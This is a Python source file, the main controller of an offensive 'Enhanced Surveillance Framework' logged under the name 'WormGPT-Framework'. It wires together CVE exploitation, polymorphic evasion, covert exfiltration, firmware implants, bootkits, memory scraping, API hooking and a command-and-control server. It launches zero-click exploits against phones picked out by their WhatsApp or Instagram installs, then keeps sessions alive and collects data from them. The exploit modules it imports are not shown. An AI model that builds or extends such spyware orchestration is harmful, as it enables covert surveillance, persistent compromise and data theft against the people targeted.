import os
import sys
import logging
import asyncio
from core.config_manager import ConfigManager
from core.database_manager import DatabaseManager
from core.session_manager import SessionManager
from exploitation.cve_exploiter import CVEExploiter
from evasion.polymorphic_engine import PolymorphicEngine
from evasion.cloakify_exfil import CloakifyExfil
from persistence.firmware_implant import FirmwareImplant
from persistence.bootkit import BootkitBuilder
from data_collection.memory_scraper import MemoryScraper
from data_collection.api_hooker import APIHooker
from c2.c2_server import C2Server

class EnhancedSurveillanceFramework:
    def __init__(self, config_file: str = "config.json"):
        self.config_manager = ConfigManager(config_file)
        self.logger = self._setup_logging()
        self.db_manager = DatabaseManager(self.config_manager)
        self.session_manager = SessionManager(self.db_manager)
        
        # Initialize components
        self.exploiter = CVEExploiter(self.config_manager, self.db_manager)
        self.evasion_engine = PolymorphicEngine(self.config_manager)
        self.exfil_engine = CloakifyExfil(self.config_manager)
        self.firmware_implant = FirmwareImplant(self.config_manager)
        self.bootkit_builder = BootkitBuilder(self.config_manager)
        self.memory_scraper = MemoryScraper(self.config_manager)
        self.api_hooker = APIHooker(self.config_manager)
        
        self.c2_server = C2Server(self.config_manager, self.session_manager, self.exfil_engine)
        self.running = False

    def _setup_logging(self):
        logging.basicConfig(
            level=getattr(logging, self.config_manager.get("framework.logging_level", "INFO")),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('logs/framework.log'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        return logging.getLogger("WormGPT-Framework")

    def setup_infrastructure(self):
        """Initialize database and directories."""
        self.logger.info("Setting up infrastructure...")
        self.db_manager.initialize()
        self._ensure_directories()
        
        # Create initial tables if not exist
        self.db_manager.create_tables()
        
        # Load CVE database
        self.exploiter.load_cve_database()
        
        self.logger.info("Infrastructure setup complete.")

    def _ensure_directories(self):
        dirs = [
            "data", "logs", "exploits", "evasion", 
            "persistence", "templates", "c2"
        ]
        for d in dirs:
            if not os.path.exists(d):
                os.makedirs(d)

    def start(self):
        """Start the main framework loop and C2 server."""
        if self.running:
            return
        
        self.running = True
        self.logger.info("Starting Enhanced Surveillance Framework v5.2...")
        
        # Initialize C2 Server
        self.c2_server.start()
        
        # Start background tasks
        asyncio.create_task(self._monitor_sessions())
        
        self.logger.info("Framework running.")

    def stop(self):
        """Gracefully shutdown the framework."""
        self.running = False
        self.c2_server.stop()
        self.logger.info("Framework stopped.")

    async def _monitor_sessions(self):
        """Monitor active sessions for data collection and persistence."""
        while self.running:
            active_sessions = self.session_manager.get_active_sessions()
            for session_id in active_sessions:
                session = self.session_manager.get_session(session_id)
                if session and session['status'] == 'active':
                    try:
                        # Run data collection
                        self.memory_scraper.scan_session(session_id)
                        self.api_hooker.intercept_session(session_id)
                        
                        # Check persistence needs
                        if not session.get('persistence_level'):
                            self.establish_persistence(session_id, level='firmware')
                            
                    except Exception as e:
                        self.logger.error(f"Error monitoring session {session_id}: {e}")
            
            await asyncio.sleep(10)

    def execute_zero_click_exploit(self, target_info: dict):
        """Execute a zero-click exploit against a target."""
        self.logger.info(f"Initiating zero-click exploit for target: {target_info.get('phone')}")
        
        # Select exploit based on installed apps
        target_app = None
        if 'com.whatsapp' in target_info.get('installed_apps', []):
            target_app = 'whatsapp'
        elif 'com.instagram.android' in target_info.get('installed_apps', []):
            target_app = 'instagram'
            
        if target_app:
            exploit_module = self.exploiter.get_zero_click_exploit(target_app)
            if exploit_module:
                session_id = self.session_manager.create_session({
                    'target_phone': target_info['phone'],
                    'target_os': target_info['android_version'],
                    'target_app': target_app,
                    'status': 'exploiting',
                    'created_at': datetime.datetime.now().isoformat()
                })
                
                # Execute exploit logic
                result = exploit_module.execute(target_info)
                self.session_manager.update_session(session_id, {'status': result['status']})
                return session_id
        return None

    def establish_persistence(self, session_id: str, level: str = 'firmware'):
        """Establish persistence on target."""
        self.logger.info(f"Establishing {level} persistence on session {session_id}")
        self.firmware_implant.generate_module(session_id)
        self.bootkit_builder.generate_bootkit(session_id)
        self.session_manager.update_session(session_id, {'persistence_level': level})

    def get_collected_data(self, session_id: str, data_type: str = None):
        """Retrieve collected data for a session."""
        return self.db_manager.get_collected_data(session_id, data_type)

if __name__ == "__main__":
    import datetime
    # Example usage
    framework = EnhancedSurveillanceFramework()
    framework.setup_infrastructure()
    framework.start()